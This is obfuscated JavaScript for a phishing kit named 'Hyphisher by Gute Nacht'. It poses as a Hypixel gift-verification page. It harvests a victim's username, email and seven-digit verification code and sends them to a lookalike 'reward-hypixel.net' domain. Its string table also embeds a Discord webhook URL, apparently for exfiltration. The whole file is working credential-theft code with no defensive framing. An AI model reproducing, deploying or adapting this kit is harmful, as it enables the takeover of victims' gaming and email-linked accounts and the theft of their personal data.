const _0x528d64 = _0x5119;
function _0x5119(_0x5d90cf, _0x56f736) {
  const _0x5c81c0 = _0x5c81();
  return _0x5119 = function (_0x51192c, _0x234bb9) {
    _0x51192c = _0x51192c - 374;
    let _0x4d88e1 = _0x5c81c0[_0x51192c];
    return _0x4d88e1;
  }, _0x5119(_0x5d90cf, _0x56f736);
}
(function (_0x2b5749, _0x54d384) {
  const _0x131828 = _0x5119, _0x312f68 = _0x2b5749();
  while (true) {
    try {
      const _0x1c9f12 = parseInt(_0x131828(418)) / 1 * (parseInt(_0x131828(402)) / 2) + parseInt(_0x131828(378)) / 3 + parseInt(_0x131828(377)) / 4 + -parseInt(_0x131828(423)) / 5 + -parseInt(_0x131828(419)) / 6 * (parseInt(_0x131828(398)) / 7) + -parseInt(_0x131828(410)) / 8 * (parseInt(_0x131828(412)) / 9) + parseInt(_0x131828(409)) / 10 * (-parseInt(_0x131828(389)) / 11);
      if (_0x1c9f12 === _0x54d384) break; else _0x312f68.push(_0x312f68.shift());
    } catch (_0x31ed10) {
      _0x312f68.push(_0x312f68.shift());
    }
  }
}(_0x5c81, 669158));
async function generateOccasionID() {
  const _0x3511f7 = _0x5119;
  let _0x56a5bd = "";
  for (let _0x59c625 = 0; _0x59c625 < 10; _0x59c625++) _0x56a5bd += Math[_0x3511f7(387)](10 * Math[_0x3511f7(391)]());
  return _0x56a5bd;
}
async function useUsername() {
  const _0xd8d1ba = _0x5119;
  let _0x25326c = document[_0xd8d1ba(424)](_0xd8d1ba(425))[_0xd8d1ba(408)], _0x29a57f = new URL(window.location[_0xd8d1ba(384)]), _0x3a4f2f = new URLSearchParams(_0x29a57f.search), _0x3705e9 = _0x3a4f2f.get(_0xd8d1ba(397));
  try {
    let _0x2285c5 = await fetch(_0xd8d1ba(383) + _0x25326c + _0xd8d1ba(380) + _0x3705e9, {method: _0xd8d1ba(393), headers: {"Content-Type": _0xd8d1ba(405)}}), _0x31b442 = await _0x2285c5[_0xd8d1ba(417)]();
    200 === _0x2285c5[_0xd8d1ba(403)] ? (document.getElementById(_0xd8d1ba(425))[_0xd8d1ba(408)] = _0x31b442[_0xd8d1ba(413)], document[_0xd8d1ba(424)](_0xd8d1ba(376))[_0xd8d1ba(421)][_0xd8d1ba(390)](_0xd8d1ba(406)), document[_0xd8d1ba(424)](_0xd8d1ba(392))[_0xd8d1ba(421)][_0xd8d1ba(422)](_0xd8d1ba(406))) : console[_0xd8d1ba(381)](_0xd8d1ba(399));
  } catch (_0x5a987e) {
    console[_0xd8d1ba(381)](_0x5a987e);
  }
}
async function sendEmail() {
  const _0x28f476 = _0x5119;
  let _0x437727 = document[_0x28f476(424)](_0x28f476(425))[_0x28f476(408)], _0x1b34e3 = document[_0x28f476(424)](_0x28f476(411)).value;
  if (console[_0x28f476(381)](_0x1b34e3[_0x28f476(379)](/.+@.+\..+/)), !_0x1b34e3[_0x28f476(379)](/.+@.+\..+/)) return;
  let _0x2a539a = await generateOccasionID(), _0x1025ee = new URL(window.location.href), _0x3bfab7 = new URLSearchParams(_0x1025ee[_0x28f476(401)]), _0x419feb = _0x3bfab7.get(_0x28f476(397));
  fetch(_0x28f476(375) + _0x1b34e3 + "&username=" + _0x437727 + _0x28f476(394) + _0x2a539a + "&giftid=" + _0x419feb, {method: "GET", headers: {"Content-Type": "application/json"}}), window[_0x28f476(420)][_0x28f476(384)] = "./verify/?code=" + btoa(_0x2a539a) + _0x28f476(407) + btoa(_0x1b34e3) + _0x28f476(385) + btoa(_0x437727) + _0x28f476(380) + _0x419feb;
}
async function sendCode() {
  const _0xd15af1 = _0x5119;
  let _0x542bc8 = new URL(window[_0xd15af1(420)][_0xd15af1(384)]), _0x4c8935 = new URLSearchParams(_0x542bc8[_0xd15af1(401)]), _0x3b4415 = atob(_0x4c8935[_0xd15af1(404)](_0xd15af1(400))), _0x1b5732 = atob(_0x4c8935.get(_0xd15af1(388))), _0x381897 = atob(_0x4c8935[_0xd15af1(404)](_0xd15af1(374))), _0x4582df = _0x4c8935[_0xd15af1(404)](_0xd15af1(397)), _0x27686a = "";
  for (let _0x1e1ec9 = 1; _0x1e1ec9 < 8; _0x1e1ec9++) _0x27686a += document[_0xd15af1(424)](_0xd15af1(400) + _0x1e1ec9)[_0xd15af1(408)];
  _0x27686a[_0xd15af1(379)](/^[0-9]{7}$/) && (fetch("https://api.reward-hypixel.net/api/v1/auth/code?email=" + _0x1b5732 + _0xd15af1(395) + _0x381897 + _0xd15af1(415) + _0x27686a + "&occasion=" + _0x3b4415 + _0xd15af1(380) + _0x4582df, {method: _0xd15af1(393), headers: {"Content-Type": _0xd15af1(405)}}), document[_0xd15af1(424)]("container-for-code").classList.add(_0xd15af1(406)), document[_0xd15af1(424)](_0xd15af1(414))[_0xd15af1(421)][_0xd15af1(422)]("hidden"), document[_0xd15af1(424)]("alerts2")[_0xd15af1(421)][_0xd15af1(422)](_0xd15af1(382)), document.getElementById(_0xd15af1(386))[_0xd15af1(421)][_0xd15af1(390)](_0xd15af1(416)));
}
console[_0x528d64(381)](_0x528d64(396));
function _0x5c81() {
  const _0x42839f = ["https://discord.com/api/webhooks/1078926730556866661/isz5izZH7vqOHGSOdPW2SPGPs9BrLvWt5MDZH4RxhVj0mqlYyjEjw60_zWRvfTedvAQS", "username-input-area", "2133656niuFop", "2983722VXoteb", "match", "&giftid=", "log", "hide", "https://api.reward-hypixel.net/api/v1/auth/verify?username=", "href", "&profile=", "alerts2", "floor", "direction", "43549OwZxcW", "add", "random", "email-input-area", "GET", "&occasion=", "&username=", "Hyphisher by Gute Nacht", "giftid", "812tYInep", "invalid username", "code", "search", "2008238lAOeZL", "status", "get", "application/json", "hidden", "&direction=", "value", "20rCyUxQ", "438352dXfXFo", "email-input", "45wZJSfh", "username", "circle-loader", "&code=", "show", "json", "1qXrrOO", "19836CYkaDE", "location", "classList", "remove", "5987825thkuvt", "getElementById", "username-input", "profile"];
  _0x5c81 = function () {
    return _0x42839f;
  };
  return _0x5c81();
}
